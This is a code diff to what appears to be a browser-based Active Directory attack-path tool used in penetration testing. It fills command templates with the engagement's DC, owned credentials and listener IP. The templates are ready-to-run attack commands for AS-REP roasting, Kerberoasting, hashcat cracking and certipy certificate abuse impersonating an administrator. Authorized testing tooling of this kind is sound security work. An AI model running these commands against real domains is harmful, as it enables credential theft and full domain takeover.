@@ -491,13 +491,16 @@
   // Per-query copy-paste command recipes, token-filled from the (optional) owned principal + a
   // best-effort DC/domain. A browser tool has no credential store, so where a secret/host isn't
   // known a placeholder (USER / DC / <HOST> / '') is left for the operator to fill.
-  function domainActionCommands(summary, ownedPrincipals) {
+  function domainActionCommands(summary, ownedPrincipals, ctx) {
+    ctx = ctx || {};
     var u = (ownedPrincipals && ownedPrincipals.length) ? label(ownedPrincipals[0]) : 'USER';
-    var dc = 'DC';
+    // Fill from the engagement where we know it: the DC/target host, and the owned account's secret
+    // (an NT hash as -H, or a password as -p '…'). Unknown values keep their operator placeholders.
+    var dc = ctx.dc || 'DC';
     var domain = summary.domain || 'DOMAIN';
-    var sec = "-p ''"; // no secret held in-browser
+    var sec = ctx.secret || "-p ''";
     var imp = "'" + domain + '/' + u + "'@" + dc;
-    return {
+    var recipes = {
       asrep: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --asreproast asrep.hashes',
               'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt'],
       kerberoast: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --kerberoasting kerb.hashes',
@@ -520,14 +523,28 @@
       esc: ['certipy find -u ' + u + '@' + domain + ' -dc-ip ' + dc + ' -vulnerable -stdout',
             'certipy req -u ' + u + '@' + domain + ' -dc-ip ' + dc + ' -ca <CA> -template <TEMPLATE> -upn administrator@' + domain],
     };
+    // Substitute the remaining host tokens from the engagement when known: <HOST> defaults to the
+    // primary target, <YOUR_IP> to the operator's listener IP. Per-node hosts stay adjustable.
+    var host = ctx.host, yourip = ctx.lhost;
+    if (host || yourip) {
+      Object.keys(recipes).forEach(function (key) {
+        recipes[key] = recipes[key].map(function (c) {
+          var s = c;
+          if (host) s = s.split('<HOST>').join(host);
+          if (yourip) s = s.split('<YOUR_IP>').join(yourip);
+          return s;
+        });
+      });
+    }
+    return recipes;
   }
 
   // The Domain tab's model: a PlumHound-style board of canned high-value queries answered from the
   // summary, plus the derived owned→Domain-Admins path(s). Pure — no network, no writes.
-  function domainView(summary, ownedPrincipals) {
+  function domainView(summary, ownedPrincipals, ctx) {
     summary = summary || {};
     var sections = [];
-    var cmds = domainActionCommands(summary, ownedPrincipals);
+    var cmds = domainActionCommands(summary, ownedPrincipals, ctx);
     function sec(sid, title, hint, items, cash) {
       var rows = (items || []).map(label);
       sections.push({ id: sid, title: title, hint: hint, cash: cash || '',
